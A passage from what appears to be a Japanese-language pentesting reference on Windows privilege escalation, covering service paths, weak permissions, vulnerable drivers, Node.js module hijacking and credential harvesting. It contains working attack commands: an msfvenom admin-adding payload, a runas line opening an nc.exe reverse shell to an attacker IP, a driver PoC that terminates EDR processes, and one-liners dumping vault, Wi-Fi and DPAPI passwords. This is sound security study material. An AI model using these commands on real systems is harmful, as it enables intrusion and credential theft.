echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit の `exploit/windows/local/trusted\_service\_path` **で検出および悪用できます**。metasploit を使ってサービスバイナリを手動で作成できます：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。このバイナリを置き換え可能な場合、privilege escalation が可能になることがあります。詳細については、[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（いずれかを上書きして privilege escalation できる可能性があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の設定ファイルを変更して特殊なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内で権限の弱いフォルダーやファイルを見つける方法は次のとおりです。
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダー内にあるすべての plugin DLL を autoload します。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動するたびに `notepad++.exe` 内で自動的に code execution が発生します（`DllMain` および plugin callbacks からの実行を含む）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別の user によって実行される registry または binary を上書きできるか確認します。**\
**次のページ**を**読んで**、**privileges を escalate するための興味深い autoruns locations**について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の不審な/脆弱な** drivers の可能性を探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler では一般的）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順については、こちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

vulnerable call が attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅延させることで（max-length component や deep directory chain を使用）、window を数マイクロ秒から数十マイクロ秒へ引き延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、個別には弱い 2 つの bug から構築できます。1 つは、queue lock が保持されたまま request/CBD が解放される **cancel-safe queue lifetime race**、もう 1 つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

Audit と exploitation に関する注意事項:

- **Free-under-lock + cancel afterwards**: success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` で block されていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- 解放された queue object を、同じサイズの attacker-controlled な paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entry は、payload と size を制御でき、後から pipe read/peek operation で probe できるため有用です。解放された object に list link が埋め込まれている場合は、それらを **user memory 内の fake request node の cyclic list** で上書きします。これにより、元の list head で終了させるのではなく、ドライバーに attacker-defined な request structure を繰り返し処理させられます。
- **Predictable write を upgrade する**: fake request によって bookkeeping write（timestamp / QPC / refcount に隣接する field）で使用される nested context pointer を redirect できる場合、**address-controlled だが value-controlled ではない** kernel write を得られる可能性があります。その場合は、最終的な code/data pointer ではなく、sprayed pool object の **length/size** field を狙います。その後、破壊された object が **out-of-bounds paged-pool read** を発生させるまで spray を列挙します。
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な候補です。攻撃者が copied buffer を拡大できる場合（例えば、多数の list/resource entry を追加して serializer の最終 allocation size を増加させるなど）、信頼性が向上します。copy が長くなることで、必ずしも machine を crash させずに replacement window を広げられるためです。
- **Pointer-rich refill target**: Windows **I/O ring** の registered-buffer array は、paged-pool size が attacker-controlled（`8 * regBufferCnt`）であり、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。これらの array の 1 つを leak し、周辺の `IORING_OBJECT` を特定した後、**`RegBuffers`** と **`RegBuffersCount`** を corrupt します。これにより、後続の I/O ring operation が attacker-forged entry を使用し、arbitrary kernel read/write を提供するようになります。利用可能な write が stable byte（例えば `KUSER_SHARED_DATA+0x14` の値）しか提供しない場合は、**overlapping unaligned write** を使用して `0x0101010101010101` のような repeated-byte user pointer を構築し、`VirtualAlloc` でそのアドレスを map して、そこに forged registered-buffer array を配置します。<sup>[[30]](#references)</sup>

Useful debugging indicator:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Once you obtain arbitrary kernel read/write from the corrupted I/O ring, 標準的な post-primitive workflow を使用して SYSTEM token を窃取します:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern な hive の脆弱性を利用すると、決定論的な layout を groom し、書き込み可能な HKLM/HKU descendants を悪用し、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain については、こちらを参照してください:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled paths による `RtlQueryRegistryValues` direct-mode type confusion

一部の driver は userland から registry path を受け取り、それが正しい UTF-16 string であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を、`int readValue` のような stack scalar に対して `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は developer が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、2 つの有用な primitive が生じます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled な絶対 `\Registry\...` path により、driver は attacker が選択した key を query でき、return code/log を通じて存在を leak し、場合によっては caller が直接 access できない value も読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、registry value type に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定された binary buffer として type-confused されます。

実践的な exploitation に関する注意点:

- **Windows 8+ mitigation**: query が **untrusted hive** に対して、`RTL_QUERY_REGISTRY_DIRECT` を使用しつつ `RTL_QUERY_REGISTRY_TYPECHECK` なしで実行されると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、`HKCU` の下に value を staging するのではなく、**trusted system hive 内の attacker-writable key** を探します。
- **Trusted-hive staging**: NtObjectManager を使用して `\Registry\Machine` 配下の writable descendants を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed context から到達可能な key を見つけます:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4バイトの `int` への8バイトの直接書き込みにより、隣接するスタックデータが破壊され、近傍のcallback/function pointerを部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext` が `UNICODE_STRING` を指していることを想定する。コードがまず攻撃者制御の `REG_DWORD` をスタック上のスカラーに読み込み、その後、同じバッファを文字列読み取りに再利用すると、攻撃者が `Length`/`MaximumLength` を制御し、`Buffer` pointerにも部分的な影響を与えられるため、半制御のkernel writeが可能になる。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは `EntryContext` にある最初の `LONG` を符号付きバッファサイズとして扱う。先行する `REG_DWORD` readによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の `REG_BINARY` queryで攻撃者のバイト列が隣接するスタックスロットを直接上書きする。これは多くの場合、callback-pointerを完全に上書きする最も容易な経路になる。

Strong hunting pattern: **同じスタック変数への異種registry readを、再初期化せずに行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される `EntryContext` pointer、および最初のregistry readが2回目のreadを実行するかどうかを制御するコードパスをgrepする。

#### Device objectでのFILE_DEVICE_SECURE_OPEN欠落の悪用（LPE + EDR kill）

一部の署名済みthird-party driverは、IoCreateDeviceSecureによって強力なSDDLを指定してdevice objectを作成するが、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れている。このflagがない場合、追加のコンポーネントを含むパスを通じてdeviceがopenされた際に、secure DACLが強制されない。そのため、権限のないユーザーでも次のようなnamespace pathを使用してhandleを取得できる:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際の事例より）

ユーザーがdeviceをopenできると、そのdriverが公開するprivileged IOCTLをLPEやtamperingに悪用できる。実環境で確認された機能の例:
- 任意のprocessへのfull-access handleを返す（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（offline tampering、boot-time persistence tricks）。
- Protected Process/Light（PP/PPL）を含む任意のprocessをterminateする。これにより、kernel経由でuser landからAV/EDR killが可能になる。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACLによる制限を意図したデバイスオブジェクトを作成する際は、必ず FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作に対する呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加する。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネルの直接的な特権ではなく、brokered model の採用を検討する。

防御担当者向けの検知案
- 疑わしいデバイス名（例：\\ .\\amsdk*）に対する user-mode からのオープンや、abuse を示す特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny list を維持する。


## PATH DLL Hijacking

**PATH 上に存在するフォルダー内への write permissions** がある場合、プロセスによってロードされる DLL を hijack し、**privileges を escalate** できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーの permissions を確認します：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、以下を参照してください:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは、**Node.js** および **Electron** アプリケーションが、期待される module が **missing** の場合に `require("foo")` のような bare import を実行すると影響を受ける、**Windows uncontrolled search path** の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリにある `node_modules` フォルダを確認して package を解決します。Windows では、この探索がドライブのルートまで到達する可能性があります。そのため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、以下を順番に確認することがあります:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package フォルダ）を配置し、**より高い権限で動作する Node/Electron process** が missing dependency を解決するのを待つことができます。payload は被害 process の security context で実行されるため、対象が administrator として実行されている場合、elevated scheduled task/service wrapper から実行される場合、または auto-start される privileged desktop app の場合は、**LPE** になります。

これは特に、以下の場合によく発生します:

- dependency が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- third-party library が `require("foo")` を `try/catch` で囲み、失敗しても処理を継続する
- production build から package が削除された、packaging 時に含まれなかった、または install に失敗した
- 脆弱な `require()` が main application code ではなく、dependency tree の深い位置に存在する

### 脆弱な対象の探索

**Procmon** を使用して resolution path を確認します:<sup>[[23]](#references)</sup>

- `Process Name` = 対象 executable（`node.exe`、Electron app EXE、または wrapper process）で filter する
- `Path` に `node_modules` が `contains` される条件で filter する
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功する open に注目する

unpacked `.asar` files または application sources で役立つ code-review パターン:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmonまたはソースレビューから**missing package name**を特定します。
2. まだ存在しない場合は、root lookup directoryを作成します。
```powershell
mkdir C:\node_modules
```
3. 期待される名前と完全に一致するモジュールを配置する：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者のアプリケーションを起動します。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに該当する、実際に存在する不足したオプションモジュールの例としては、`bluebird` や `utf-8-validate` があります。ただし、再利用可能な部分は **手法** です。特権 Windows Node/Electron プロセスが解決する、任意の **不足した bare import** を見つけてください。

### 検出および hardening のアイデア

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルやパッケージを書き込んだりした際にアラートを生成する。
- 高い整合性レベルで動作するプロセスによる `C:\node_modules\*` からの読み取りをハントする。
- 本番環境ですべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用を監査する。
- サードパーティコードで、`try { require("...") } catch {}` のようにエラーを通知せず処理するパターンを確認する。
- ライブラリが対応している場合は、オプションの probe を無効にする（たとえば、一部の `ws` デプロイでは `WS_NO_UTF_8_VALIDATE=1` により、従来の `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有フォルダー
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hostsファイル

hostsファイルにハードコードされている、既知の他のコンピューターを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Firewall 関連のコマンドについてはこのページを確認**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧表示、ルールの作成、無効化、無効化...)**

ネットワーク enumeration 用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、`nc` による通信を firewall で許可するかどうかを GUI で尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows の認証情報

### Winlogon の認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>より\
Windows Vaultは、**Windows**が**ユーザーを自動的にログインさせる**ために使用できる、サーバー、Webサイト、その他のプログラム用のユーザー認証情報を保存します。最初は、ユーザーがFacebook、Twitter、Gmailなどのサイトの認証情報を保存し、ブラウザに自動的にログインさせられるように聞こえるかもしれませんが、実際の動作は異なります。

Windows Vaultは、Windowsがユーザーを自動的にログインさせるための認証情報を保存します。つまり、**リソース（サーバーまたはWebサイト）へのアクセスに認証情報を必要とするWindowsアプリケーション**であれば、**このCredential Manager**およびWindows Vaultを利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された認証情報を使用できます。

アプリケーションがCredential Managerと連携しない限り、特定のリソース用の認証情報を使用することはできないと思います。したがって、アプリケーションでvaultを利用したい場合は、何らかの方法で**credential managerと通信し、そのリソースの認証情報を**デフォルトのストレージvaultから**要求する必要があります**。

`cmdkey`を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために、`runas` と `/savecred` オプションを使用できます。次の例では、SMB share 経由でリモート binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報セットで `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) に注意してください。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても公開されています）内に認証トークンと平文パスワードを保存します。このストレージ領域はセッション単位で分離されており、管理者権限や `SeDebugPrivilege` 権限がなくてもネイティブに復号できます。

ユーザーのアクティブなセッション内で、次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座に dump して復号できます。
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称秘密鍵を対称暗号化するために使用される、データの対称暗号化方式を提供します。この暗号化では、ユーザーまたはシステムの秘密情報を利用してエントロピーに大きく寄与させます。

**DPAPI は、ユーザーのログイン秘密情報から派生した対称鍵を介して鍵を暗号化できます**。システム暗号化の場合は、システムのドメイン認証秘密情報を使用します。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じファイル内でユーザーの秘密鍵を保護する master key と同じ場所に配置された DPAPI key** は、通常、ランダムな 64 バイトのデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用して復号できます。

**マスターパスワードで保護された credentials files** は、通常次の場所にあります。
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
`/masterkey` を適切に指定すると、**mimikatz module** の `dpapi::cred` を使用して復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から多数の **DPAPI** **masterkeys** を**抽出**できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されます。通常、作成時と同じコンピューター上の同じユーザーだけが復号できます。

それを含むファイルから PS credentials を**復号**するには、次のようにします。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
適切な `/masterkey` とともに **Mimikatz** の `dpapi::rdg` module を使用して、**任意の .rdg files を decrypt** する\
Mimikatz の `sekurlsa::dpapi` module を使用すると、メモリから **多数の DPAPI masterkeys を extract** できる

### Sticky Notes

Windows workstations では、StickyNotes app が database file であることに気付かず、**passwords** やその他の情報を**保存**するためによく使用されます。この file は `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe から passwords を recover するには、Administrator であり、かつ High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` directory にあります。\
この file が存在する場合、何らかの **credentials** が configure されており、**recover** できる可能性があります。

この code は [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から extract されたものです：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
Installers は **SYSTEM 権限で実行される**ため、多くが **DLL Sideloading に対して脆弱です（情報提供元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### PuTTYの認証情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSH keys

SSH private keysはレジストリキー`HKCU\Software\OpenSSH\Agent\Keys`内に保存されている可能性があるため、そこに興味深いものがないか確認します。
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存されたSSH鍵です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)を使用すれば簡単に復号できます。\
